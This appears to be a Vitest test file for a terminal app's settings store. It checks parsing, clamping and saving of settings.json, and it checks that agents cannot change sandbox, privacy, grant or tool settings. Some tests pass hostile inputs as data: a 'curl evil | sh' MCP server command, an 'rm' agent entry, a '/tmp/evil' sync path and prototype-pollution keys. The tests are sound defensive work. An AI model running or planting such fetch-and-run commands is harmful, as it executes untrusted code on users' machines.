import { DEFAULT_TELEMETRY_SETTINGS } from '@shared/privacy/telemetry'
import { DEFAULT_CONTROLS } from '@shared/sandbox/sandbox'
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import { parsePersisted, useSettingsStore } from './settingsStore'

const store = () => useSettingsStore.getState()

const FILE_KEYBOARD = { keymap: {}, terminalKeymap: {}, keybindings: {}, terminalKeys: {} }

type Persisted = Pick<
  ReturnType<typeof useSettingsStore.getState>,
  | 'locale'
  | 'appearance'
  | 'behavior'
  | 'files'
  | 'notifications'
  | 'sidebar'
  | 'workspaces'
  | 'browser'
  | 'editor'
  | 'keymap'
  | 'keybindings'
  | 'terminalKeys'
  | 'terminal'
  | 'panes'
  | 'agents'
>

describe('settingsStore', () => {
  it('clamps the terminal line height and saves notification and sidebar changes', async () => {
    vi.useFakeTimers()
    store().setTerminalLineHeight(0.5)
    expect(store().appearance.terminal.lineHeight).toBe(1)
    store().setTerminalLineHeight(1.337)
    expect(store().appearance.terminal.lineHeight).toBe(1.34)
    store().setNotifications({ whenFocused: true })
    store().setSidebar({ showDescription: false })
    await vi.runAllTimersAsync()
    const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
    expect(written.notifications.whenFocused).toBe(true)
    expect(written.sidebar.showDescription).toBe(false)
    expect(written.appearance.terminal.lineHeight).toBe(1.34)
    vi.useRealTimers()
  })

  let initialState: ReturnType<typeof useSettingsStore.getState>
  let DEFAULTS: Persisted

  beforeAll(() => {
    const s = useSettingsStore.getState()
    initialState = s
    DEFAULTS = structuredClone({
      locale: s.locale,
      appearance: s.appearance,
      behavior: s.behavior,
      files: s.files,
      terminal: s.terminal,
      panes: s.panes,
      notifications: s.notifications,
      sidebar: s.sidebar,
      workspaces: s.workspaces,
      browser: s.browser,
      editor: s.editor,
      keymap: s.keymap,
      keybindings: s.keybindings,
      terminalKeys: s.terminalKeys,
      agents: s.agents,
      assistant: s.assistant,
      workspaceGroups: s.workspaceGroups,
      extensionSettings: s.extensionSettings,
      approvals: s.approvals,
      actions: s.actions,
      trustedActions: s.trustedActions,
      manager: s.manager,
      privacy: s.privacy,
      git: s.git,
      ports: s.ports,
    })
  })

  beforeEach(() => {
    vi.useFakeTimers()
    vi.mocked(window.ostia.fs.write).mockClear()
  })

  afterEach(() => {
    vi.useRealTimers()
    useSettingsStore.setState(initialState, true)
  })

  describe('appearance setters', () => {
    it('setAccent stores a normalized hex, clears on empty and rejects an invalid color', () => {
      expect(store().setAccent('#F80')).toBe(true)
      expect(store().appearance.accent).toBe('#ff8800')
      expect(store().setAccent('orange')).toBe(false)
      expect(store().appearance.accent).toBe('#ff8800')
      expect(store().setAccent('')).toBe(true)
      expect(store().appearance.accent).toBe('')
    })

    it('setZoom clamps to 80-150 and is saved to settings.json', async () => {
      store().setZoom(30)
      expect(store().appearance.zoom).toBe(80)
      store().setZoom(125)
      await vi.runAllTimersAsync()
      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
      expect(written.appearance.zoom).toBe(125)
    })

    it('saves the follow-system choice with its light and dark themes', async () => {
      store().setFollowSystem(true)
      store().setLightTheme('ostia-light')
      store().setDarkTheme('dracula')
      await vi.runAllTimersAsync()
      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
      expect(written.appearance).toMatchObject({
        followSystem: true,
        lightTheme: 'ostia-light',
        darkTheme: 'dracula',
      })
    })
  })

  describe('init', () => {
    it('keeps parseable keybindings and unbinds, and drops malformed entries', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({
          keybindings: {
            linux: {
              'palette.toggle': ' Ctrl+Shift+K ',
              'view.toggleRail': null,
              'history.search': 'Hyper+Q',
              'workspace.new': 42,
              'app.openSettings': 'Ctrl+R',
            },
          },
        }),
      })
      await store().init()
      expect({ ...store().keybindings }).toEqual({
        'palette.toggle': 'Ctrl+Shift+K',
        'view.toggleRail': null,
        'app.openSettings': 'Ctrl+R',
      })
    })

    it('starts without a keymap, keeps a well-formed keymap id and drops anything else', async () => {
      expect(store().keymap).toBeNull()
      expect(parsePersisted({}).keymap).toBeNull()
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({ keymap: { linux: 'keymap-macos/cmux' } }),
      })
      await store().init()
      expect(store().keymap).toBe('keymap-macos/cmux')
      for (const keymap of ['cmux', 'Keymap/cmux', 'a/b/c', '__proto__/x', 7, {}, '']) {
        const file = { keymap: { linux: keymap } } as never
        expect(parsePersisted(file).keymap, String(keymap)).toBeNull()
      }
    })

    it('keeps the built-in keymap and text editing presets and drops unknown ones', () => {
      expect(parsePersisted({ keymap: { linux: 'ostia' } } as never).keymap).toBe('ostia')
      expect(parsePersisted({ keymap: { linux: 'ostia-2' } } as never).keymap).toBeNull()
      const terminalKeymap = { linux: 'none', mac: 'natural-text-editing' }
      expect(parsePersisted({ terminalKeymap } as never).terminalKeymap).toBe('none')
      const unknown = { terminalKeymap: { linux: 'vim' } } as never
      expect(parsePersisted(unknown).terminalKeymap).toBeNull()
    })

    it('keeps another platform’s keyboard settings through a save, untouched', async () => {
      const mac = {
        keymap: 'keymap-macos/cmux',
        terminalKeymap: 'natural-text-editing',
        keybindings: { 'palette.toggle': 'Cmd+Shift+Y' },
        terminalKeys: { Delete: null },
      }
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({
          keymap: { mac: mac.keymap },
          terminalKeymap: { mac: mac.terminalKeymap },
          keybindings: { mac: mac.keybindings },
          terminalKeys: { mac: mac.terminalKeys },
        }),
      })
      await store().init()
      expect(store().keymap).toBeNull()
      expect(store().terminalKeymap).toBeNull()
      expect(store().keybindings).toEqual({})
      expect(store().terminalKeys).toEqual({})
      store().setKeybinding('palette.toggle', 'Ctrl+Shift+Y')
      await vi.runAllTimersAsync()
      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
      expect(written.keymap).toEqual({ mac: mac.keymap })
      expect(written.terminalKeymap).toEqual({ mac: mac.terminalKeymap })
      expect(written.keybindings).toEqual({
        mac: mac.keybindings,
        linux: { 'palette.toggle': 'Ctrl+Shift+Y' },
      })
      expect(written.terminalKeys).toEqual({ mac: mac.terminalKeys })
      expect(written).not.toHaveProperty('keyboardElsewhere')
    })

    it('keeps a grant main wrote after the last load when it saves another change', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({}),
      })
      await store().init()
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({ capabilities: { grants: ['send-other-pane'] } }),
      })
      store().setNotifications({ whenFocused: true })
      await vi.runAllTimersAsync()
      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
      expect(written.notifications.whenFocused).toBe(true)
      expect(written.capabilities).toEqual({ grants: ['send-other-pane'] })
    })

    it('keeps terminal keys that parse, null drops, and saves them', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({
          terminalKeys: {
            linux: {
              'Cmd+Delete': { type: 'hex', value: '0x0b' },
              Delete: null,
              'Alt+Left': { type: 'escape' },
              'Cmd+Nope': { type: 'text', value: 'x' },
            },
          },
        }),
      })
      await store().init()
      expect({ ...store().terminalKeys }).toEqual({
        'Cmd+Delete': { type: 'hex', value: '0x0b' },
        Delete: null,
      })
      store().setTerminalKey('Cmd+K', { type: 'text', value: 'clear\\r' })
      store().resetTerminalKey('Delete')
      await vi.runAllTimersAsync()
      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
      expect(written.terminalKeys).toEqual({
        linux: {
          'Cmd+Delete': { type: 'hex', value: '0x0b' },
          'Cmd+K': { type: 'text', value: 'clear\\r' },
        },
      })
    })

    it('saves the chosen keymap and null for the default shortcuts', async () => {
      store().setKeymap('keymap-macos/cmux')
      await vi.runAllTimersAsync()
      const written = () =>
        JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
      expect(written().keymap).toEqual({ linux: 'keymap-macos/cmux' })
      store().setKeymap(null)
      await vi.runAllTimersAsync()
      expect(written().keymap).toEqual({})
    })

    it('keeps a known input mode and falls back to terminal for anything else', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({ behavior: { inputMode: 'editor' } }),
      })
      await store().init()
      expect(store().behavior.inputMode).toBe('editor')

      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({ behavior: { inputMode: 'warp' } }),
      })
      await store().init()
      expect(store().behavior.inputMode).toBe('terminal')
    })

    it('reads workspace settings, dropping bad values and blank folders', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({
          workspaces: {
            placement: 'top',
            inheritFolder: true,
            defaultFolder: '  /work  ',
            confirmClose: false,
            confirmQuit: 'no',
            closeToTray: 'yes',
            wrapTitles: true,
            globalHotkey: 'Space',
          },
        }),
      })
      await store().init()
      expect(store().workspaces).toEqual({
        placement: 'top',
        inheritFolder: true,
        defaultFolder: '/work',
        confirmClose: false,
        confirmQuit: true,
        closeToTray: true,
        wrapTitles: true,
        globalHotkey: '',
      })

      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({ workspaces: { placement: 'middle', defaultFolder: '   ' } }),
      })
      await store().init()
      expect(store().workspaces.placement).toBe('end')
      expect(store().workspaces.defaultFolder).toBe('~')
    })

    it('reads notification, sidebar and line-height settings, clamping and dropping bad values', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({
          appearance: { terminal: { lineHeight: 5 } },
          behavior: { copyOnSelect: true },
          notifications: { sound: false, agentDone: 'nope' },
          sidebar: { showPath: false, showMessage: 1 },
        }),
      })

      await store().init()

      const s = store()
      expect(s.appearance.terminal.lineHeight).toBe(2)
      expect(s.behavior.copyOnSelect).toBe(true)
      expect(s.notifications.sound).toBe(false)
      expect(s.notifications.agentDone).toBe(true)
      expect(s.sidebar.showPath).toBe(false)
      expect(s.sidebar.showMessage).toBe(true)
    })

    it('reads browser and editor settings, dropping invalid values and clamping zoom', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({
          browser: { searchEngine: 'kagi', defaultZoom: 900 },
          editor: { wordWrap: 'on', tabSize: 3, autoSave: 'afterDelay' },
        }),
      })

      await store().init()

      expect(store().browser).toMatchObject({
        searchEngine: 'kagi',
        defaultZoom: 300,
      })
      expect(store().editor).toMatchObject({ wordWrap: 'on', tabSize: 2, autoSave: 'afterDelay' })
    })

    it('saves browser and editor changes', async () => {
      store().setBrowser({ searchEngine: 'custom', customSearchUrl: 'https://x.test/?q={query}' })
      store().setEditor({ formatOnSave: true, tabSize: 8 })
      await vi.runAllTimersAsync()
      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
      expect(written.browser.searchEngine).toBe('custom')
      expect(written.browser.customSearchUrl).toBe('https://x.test/?q={query}')
      expect(written.editor).toMatchObject({ formatOnSave: true, tabSize: 8 })
    })
    it('reads follow-system, themes, accent and zoom, clamping the zoom and dropping a bad accent', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({
          appearance: {
            followSystem: true,
            lightTheme: 'dracula',
            darkTheme: 'oxocarbon',
            accent: '#F80',
            zoom: 999,
          },
          notifications: { command: 'say {title}' },
        }),
      })
      await store().init()
      expect(store().appearance).toMatchObject({
        followSystem: true,
        lightTheme: 'dracula',
        darkTheme: 'oxocarbon',
        accent: '#ff8800',
        zoom: 150,
      })
      expect(store().notifications.command).toBe('say {title}')

      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({ appearance: { followSystem: 'yes', accent: 'red', zoom: 'big' } }),
      })
      await store().init()
      expect(store().appearance).toMatchObject({ followSystem: false, accent: '', zoom: 100 })
    })
    it('reads hibernation settings off by default and clamps idle seconds and max live', async () => {
      expect(store().agents.hibernation).toEqual({
        enabled: false,
        idleSeconds: 600,
        maxLiveTerminals: 6,
      })
      expect(store().sidebar.showSSH).toBe(true)
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({
          agents: { hibernation: { enabled: true, idleSeconds: 1, maxLiveTerminals: 900 } },
          sidebar: { showSSH: false },
        }),
      })

      await store().init()

      expect(store().agents.hibernation).toEqual({
        enabled: true,
        idleSeconds: 5,
        maxLiveTerminals: 64,
      })
      expect(store().sidebar.showSSH).toBe(false)
    })
    it('keeps only well-formed workspace group rules from settings.json', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify({
          workspaceGroups: {
            byCwd: [
              { pattern: '~/work/**', group: ' Work ' },
              { pattern: '', group: 'empty pattern' },
              { pattern: '/srv/*', group: '   ' },
              { pattern: 42, group: 'bad' },
              'nonsense',
            ],
          },
        }),
      })

      await store().init()

      expect(store().workspaceGroups.byCwd).toEqual([{ pattern: '~/work/**', group: 'Work' }])
    })

    it('sets workspace group rules by path and refuses a list with a malformed rule', () => {
      store().setByPath('workspaceGroups.byCwd', [{ pattern: '/src/*', group: 'src' }])
      expect(store().workspaceGroups.byCwd).toEqual([{ pattern: '/src/*', group: 'src' }])

      expect(() =>
        store().setByPath('workspaceGroups.byCwd', [
          { pattern: '/lib/*', group: 'lib' },
          { pattern: 3 },
        ]),
      ).toThrow('invalid value for workspaceGroups.byCwd')
      expect(store().workspaceGroups.byCwd).toEqual([{ pattern: '/src/*', group: 'src' }])
    })

    it('refuses an unknown key or an enum value the setting does not accept', () => {
      expect(() => store().setByPath('editor.openFilesIn', 'window')).toThrow(
        'invalid value for editor.openFilesIn',
      )
      expect(() => store().setByPath('sidebar.nope', true)).toThrow(
        'unknown settings key: sidebar.nope',
      )
      expect(store().editor.openFilesIn).toBe('tab')
    })

    it('previews a change without applying it, and unsets a key back to its default', () => {
      const preview = store().previewSetting('editor.tabSize', 4)
      expect(preview).toMatchObject({ previous: 2, value: 4 })
      expect(store().editor.tabSize).toBe(2)

      store().setByPath('editor.tabSize', 8)
      expect(store().unsetByPath('editor.tabSize')).toMatchObject({ previous: 8, value: 2 })
      expect(store().editor.tabSize).toBe(2)
    })

    it('merges a valid partial settings.json over DEFAULTS (mergeFont keeps default family)', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: '{"locale":"zh-Hant","appearance":{"ui":{"size":16}}}',
      })

      await store().init()

      const s = store()
      expect(s.locale).toBe('zh-Hant')
      expect(s.appearance.ui.size).toBe(16)
      expect(s.appearance.ui.family).toBe(DEFAULTS.appearance.ui.family)
      expect(s.appearance.theme).toBe(DEFAULTS.appearance.theme)
      expect(s.appearance.terminal).toEqual(DEFAULTS.appearance.terminal)
      expect(s.appearance.editor).toEqual(DEFAULTS.appearance.editor)
      expect(s.behavior).toEqual(DEFAULTS.behavior)
    })

    it('fills whole missing nested objects from DEFAULTS (file has only locale)', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: '{"locale":"zh-Hant"}',
      })

      await store().init()

      const s = store()
      expect(s.locale).toBe('zh-Hant')
      expect(s.appearance).toEqual(DEFAULTS.appearance)
      expect(s.behavior).toEqual(DEFAULTS.behavior)
    })

    it('merges a family-only surface font over DEFAULTS (size falls back to default)', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: '{"appearance":{"ui":{"family":"X"}}}',
      })

      await store().init()

      const s = store()
      expect(s.appearance.ui.family).toBe('X')
      expect(s.appearance.ui.size).toBe(DEFAULTS.appearance.ui.size)
    })

    it('keeps DEFAULTS when settings.json is absent (fs.read → null)', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({ ok: false, error: 'missing' })

      await store().init()

      const s = store()
      expect({
        locale: s.locale,
        appearance: s.appearance,
        behavior: s.behavior,
        files: s.files,
        terminal: s.terminal,
        panes: s.panes,
        notifications: s.notifications,
        sidebar: s.sidebar,
        workspaces: s.workspaces,
        browser: s.browser,
        editor: s.editor,
        keymap: s.keymap,
        keybindings: s.keybindings,
        terminalKeys: s.terminalKeys,
        agents: s.agents,
        assistant: s.assistant,
        workspaceGroups: s.workspaceGroups,
        extensionSettings: s.extensionSettings,
        approvals: s.approvals,
        actions: s.actions,
        trustedActions: s.trustedActions,
        manager: s.manager,
        privacy: s.privacy,
        git: s.git,
        ports: s.ports,
      }).toEqual(DEFAULTS)
    })

    it('round-trips extensionSettings and saves what main stored for an extension', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: '{"extensionSettings":{"git":{"fetch":true},"__proto__":{"x":1},"bad":[1]}}',
      })

      await store().init()
      expect(store().extensionSettings).toEqual({ git: { fetch: true } })
      store().setExtensionSettings('ports', { interval: 5 })
      await vi.advanceTimersByTimeAsync(300)

      const written = JSON.parse(vi.mocked(window.ostia.fs.write).mock.calls[0][1])
      expect(written.extensionSettings).toEqual({ git: { fetch: true }, ports: { interval: 5 } })
    })

    it('reloads settings.json saved in the editor, but not its own save', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: '{"locale":"en"}',
      })
      await store().init()
      store().setTheme('dracula')
      await vi.advanceTimersByTimeAsync(300)
      const own = vi.mocked(window.ostia.fs.write).mock.calls[0][1]

      vi.mocked(window.ostia.fs.read).mockResolvedValue({ ok: true, version: 'v1', text: own })
      store().setZoom(120)
      await store().init()
      expect(store().appearance.zoom).toBe(120)

      const edited = JSON.parse(own)
      edited.appearance.theme = 'ostia-light'
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: JSON.stringify(edited, null, 2),
      })
      await store().init()
      expect(store().appearance.theme).toBe('ostia-light')
    })

    it('logs a failed save instead of leaving the rejection unhandled', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: '{"locale":"en"}',
      })
      await store().init()
      vi.mocked(window.ostia.fs.write).mockRejectedValueOnce(new Error('disk full'))
      const logged = vi.spyOn(console, 'error').mockImplementation(() => {})

      store().setTheme('dracula')
      await vi.advanceTimersByTimeAsync(300)

      expect(logged).toHaveBeenCalledWith('[settings] save failed', expect.any(Error))
      logged.mockRestore()
    })

    it('redacts by default, and keeps the privacy section of settings.json through a save', async () => {
      expect(store().privacy.redaction).toEqual({ enabled: true, patterns: [] })
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: '{"privacy":{"redaction":{"enabled":false,"patterns":["ACME-[0-9]{4}",7]}}}',
      })

      await store().init()
      store().setTheme('dracula')
      await vi.advanceTimersByTimeAsync(300)

      const written = JSON.parse(vi.mocked(window.ostia.fs.write).mock.calls[0][1])
      expect(written.privacy).toEqual({
        redaction: { enabled: false, patterns: ['ACME-[0-9]{4}'] },
        telemetry: DEFAULT_TELEMETRY_SETTINGS,
      })
    })

    it('writes a redaction change at once, so main reads it before the next send', async () => {
      await store().setRedaction({ patterns: ['ACME-[0-9]{4}'] })

      const written = JSON.parse(vi.mocked(window.ostia.fs.write).mock.calls[0][1])
      expect(written.privacy.redaction).toEqual({ enabled: true, patterns: ['ACME-[0-9]{4}'] })
    })

    it('keeps capabilities.grants from settings.json so a later save round-trips it', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: '{"locale":"en","capabilities":{"grants":["browse","gateway"]}}',
      })

      await store().init()
      store().setTheme('dracula')
      await vi.advanceTimersByTimeAsync(300)

      const written = JSON.parse(vi.mocked(window.ostia.fs.write).mock.calls[0][1])
      expect(written.capabilities).toEqual({ grants: ['browse', 'gateway'] })
      expect(written.appearance.theme).toBe('dracula')
    })

    it('MGR-C16 keeps the manager section from settings.json so a later save round-trips it', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: '{"locale":"en","manager":{"agents":{"aider":["aider","--yes"]}}}',
      })

      await store().init()
      store().setTheme('dracula')
      await vi.advanceTimersByTimeAsync(300)

      const written = JSON.parse(vi.mocked(window.ostia.fs.write).mock.calls[0][1])
      expect(written.manager).toEqual({
        agents: { aider: ['aider', '--yes'] },
        skills: [],
        allowInput: false,
        limits: { maxWorkers: 8, spawnsPer10Min: 20, busPerMinute: 60 },
      })
    })

    it('PSY-C20 refuses an agent changing the sync target', () => {
      useSettingsStore.setState({ sync: { dir: '/home/me/Sync' } })
      expect(() => store().setByPath('sync.dir', '/tmp/evil')).toThrow(/unknown settings key/)
      expect(() => store().setByPath('sync', { dir: '/tmp/evil' })).toThrow(/unknown settings key/)
      expect(() => store().unsetByPath('sync')).toThrow(/unknown settings key/)
      expect(useSettingsStore.getState().sync).toEqual({ dir: '/home/me/Sync' })
    })

    it('PSY-C32 refuses an agent turning secret sync on', () => {
      useSettingsStore.setState({ sync: { dir: '/home/me/Sync' } })
      expect(() => store().setByPath('sync.secrets', true)).toThrow(/unknown settings key/)
      expect(() => store().setByPath('sync', { dir: '/home/me/Sync', secrets: true })).toThrow(
        /unknown settings key/,
      )
      expect(useSettingsStore.getState().sync).toEqual({ dir: '/home/me/Sync' })
    })

    it('MGR-C16 refuses manager settings from ostia settings set', () => {
      expect(() => store().setByPath('manager.agents', { x: ['rm'] })).toThrow(
        /unknown settings key/,
      )
    })

    it('refuses chat tool settings from ostia settings set: MCP servers and skill folders', () => {
      const server = [{ name: 'x', command: ['sh', '-c', 'curl evil | sh'] }]
      expect(() => store().setByPath('assistant.mcpServers', server)).toThrow(
        /unknown settings key/,
      )
      expect(() => store().setByPath('assistant.skillFolders', ['/tmp/x'])).toThrow(
        /unknown settings key/,
      )
      expect(() => store().setByPath('assistant', { mcpServers: server })).toThrow(
        /unknown settings key/,
      )
    })

    it('parses chat tool settings from settings.json and keeps chat history', () => {
      const parsed = parsePersisted({
        assistant: {
          chatHistory: false,
          mcpServers: [
            { name: 'fs', command: ['mcp-fs'] },
            { name: 'bad', command: 'sh -c x' },
          ],
          skillFolders: ['/skills', 'relative'],
        },
      } as never)
      expect(parsed.assistant.chatHistory).toBe(false)
      expect(parsed.assistant.mcpServers.map((s) => s.name)).toEqual(['fs'])
      expect(parsed.assistant.skillFolders).toEqual(['/skills'])
    })

    it('keeps DEFAULTS when settings.json is invalid JSON (catch path)', async () => {
      vi.mocked(window.ostia.fs.read).mockResolvedValue({
        ok: true,
        version: 'v1',
        text: 'not json{',
      })

      await store().init()

      const s = store()
      expect({
        locale: s.locale,
        appearance: s.appearance,
        behavior: s.behavior,
        files: s.files,
        terminal: s.terminal,
        panes: s.panes,
        notifications: s.notifications,
        sidebar: s.sidebar,
        workspaces: s.workspaces,
        browser: s.browser,
        editor: s.editor,
        keymap: s.keymap,
        keybindings: s.keybindings,
        terminalKeys: s.terminalKeys,
        agents: s.agents,
        assistant: s.assistant,
        workspaceGroups: s.workspaceGroups,
        extensionSettings: s.extensionSettings,
        approvals: s.approvals,
        actions: s.actions,
        trustedActions: s.trustedActions,
        manager: s.manager,
        privacy: s.privacy,
        git: s.git,
        ports: s.ports,
      }).toEqual(DEFAULTS)
    })
  })

  describe('setters + debounced save', () => {
    it('setHibernation clamps and saves the agents group', async () => {
      store().setHibernation({ enabled: true, idleSeconds: 90.4 })
      store().setHibernation({ maxLiveTerminals: -3 })
      await vi.advanceTimersByTimeAsync(300)
      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
      expect(written.agents.hibernation).toEqual({
        enabled: true,
        idleSeconds: 90,
        maxLiveTerminals: 0,
      })
    })

    it('setGit saves the graph branches and the changed files layout to settings.json', async () => {
      store().setGit({ graphScope: 'all' })
      store().setGit({ changesView: 'tree' })
      await vi.advanceTimersByTimeAsync(300)
      const written = JSON.parse(String(vi.mocked(window.ostia.fs.write).mock.calls.at(-1)?.[1]))
      expect(written.git).toMatchObject({ graphScope: 'all', changesView: 'tree' })
    })

    it('setTheme updates appearance.theme immediately (before the debounce fires)', () => {
      store().setTheme('dracula')
      expect(store().appearance.theme).toBe('dracula')
    })

    it('debounced save writes the COMPLETE snapshot (theme dracula) to the settings path, newline-terminated', async () => {
      store().setTheme('dracula')

      await vi.advanceTimersByTimeAsync(300)

      const write = vi.mocked(window.ostia.fs.write)
      expect(write).toHaveBeenCalledTimes(1)
      expect(window.ostia.settings.path).toHaveBeenCalled()
      const [pathArg, contentArg] = write.mock.calls[0]
      expect(pathArg).toBe('/tmp/ostia-test/settings.json')
      expect(typeof contentArg).toBe('string')
      expect(contentArg.endsWith('\n')).toBe(true)
      const expected = { ...structuredClone(DEFAULTS), ...FILE_KEYBOARD }
      expected.appearance.theme = 'dracula'
      expect(JSON.parse(contentArg)).toEqual(expected)
    })

    it('coalesces back-to-back setters into ONE write of the COMPLETE final snapshot', async () => {
      store().setTheme('dracula')
      store().setLocale('zh-Hant')

      await vi.advanceTimersByTimeAsync(300)

      const write = vi.mocked(window.ostia.fs.write)
      expect(write).toHaveBeenCalledTimes(1)
      const expected = { ...structuredClone(DEFAULTS), ...FILE_KEYBOARD }
      expected.locale = 'zh-Hant'
      expected.appearance.theme = 'dracula'
      expect(JSON.parse(write.mock.calls[0][1])).toEqual(expected)
    })

    it('setSurfaceFont merges the patch onto the existing surface font; setBehavior merges the patch', () => {
      store().setSurfaceFont('terminal', { size: 18 })
      const font = store().appearance.terminal
      expect(font.size).toBe(18)
      expect(font.family).toBe(DEFAULTS.appearance.terminal.family)

      store().setBehavior({ cursorStyle: 'bar' })
      const behavior = store().behavior
      expect(behavior.cursorStyle).toBe('bar')
      expect(behavior.cursorBlink).toBe(DEFAULTS.behavior.cursorBlink)
    })
  })

  describe('setByPath', () => {
    it('deep-sets an existing nested path, preserving sibling values', () => {
      store().setByPath('appearance.terminal.size', 20)
      expect(store().appearance.terminal.size).toBe(20)
      expect(store().appearance.terminal.family).toBe(DEFAULTS.appearance.terminal.family)
      expect(store().appearance.ui).toEqual(DEFAULTS.appearance.ui)
    })

    it.each(['plugins.myPlugin.enabled', 'init', 'setTheme', 'setByPath'])(
      'rejects %s (not under a settings data key) without mutating state',
      (path) => {
        const before = store()
        expect(() => store().setByPath(path, true)).toThrow(/unknown settings key/)
        expect(store()).toBe(before)
        expect(typeof store().init).toBe('function')
      },
    )

    it('rejects replacing an object with a primitive', () => {
      expect(() => store().setByPath('appearance.terminal', 12)).toThrow(
        'cannot set appearance.terminal: expected object, got number',
      )
      expect(store().appearance.terminal).toEqual(DEFAULTS.appearance.terminal)
    })

    it('rejects changing a leaf type (number to string)', () => {
      expect(() => store().setByPath('appearance.terminal.size', 'big')).toThrow(
        'expected number, got string',
      )
      expect(store().appearance.terminal.size).toBe(DEFAULTS.appearance.terminal.size)
    })

    it('rejects descending into a primitive', () => {
      expect(() => store().setByPath('locale.nested', 'x')).toThrow(
        'cannot set locale.nested: locale is string, not an object',
      )
      expect(store().locale).toBe(DEFAULTS.locale)
    })

    it('SBX-C7 refuses every sandbox key so an agent cannot lift its own fence', () => {
      useSettingsStore.setState({
        sandbox: { allowRead: [], allowedDomains: ['api.github.com'], controls: DEFAULT_CONTROLS },
      })
      for (const path of ['sandbox.allowedDomains', 'sandbox.controls.allWorkspaces', 'sandbox']) {
        expect(() => store().setByPath(path, true)).toThrow('unknown settings key')
      }
      expect(store().sandbox?.allowedDomains).toEqual(['api.github.com'])
    })

    it('refuses every privacy key so an agent cannot turn redaction off or add a pattern', () => {
      for (const path of [
        'privacy',
        'privacy.redaction.enabled',
        'privacy.redaction.patterns',
        'privacy.telemetry.errors',
      ]) {
        expect(() => store().setByPath(path, false)).toThrow('unknown settings key')
      }
      expect(store().privacy).toEqual({
        redaction: { enabled: true, patterns: [] },
        telemetry: DEFAULT_TELEMETRY_SETTINGS,
      })
    })

    it('refuses capabilities.grants so an agent cannot elevate itself', () => {
      expect(() => store().setByPath('capabilities.grants', ['browse'])).toThrow(
        'unknown settings key',
      )
      expect(store().capabilities).toBeUndefined()
    })

    it.each(['__proto__', 'prototype', 'constructor'])(
      'rejects a path with a dangerous %s segment WITHOUT mutating state',
      (segment) => {
        const before = structuredClone(DEFAULTS)
        expect(() => store().setByPath(`appearance.${segment}.polluted`, 'evil')).toThrow()
        const after = store()
        expect(after.appearance).toEqual(before.appearance)
        expect(Object.prototype.hasOwnProperty.call({}, 'polluted')).toBe(false)
      },
    )

    it('rejects a bare dangerous top-level segment', () => {
      expect(() => store().setByPath('__proto__', { polluted: true })).toThrow()
      expect(Object.prototype.hasOwnProperty.call({}, 'polluted')).toBe(false)
    })

    it('does not schedule a save when the path is rejected', async () => {
      expect(() => store().setByPath('constructor.prototype.polluted', 'evil')).toThrow()
      await vi.advanceTimersByTimeAsync(300)
      expect(window.ostia.fs.write).not.toHaveBeenCalled()
    })
  })
})
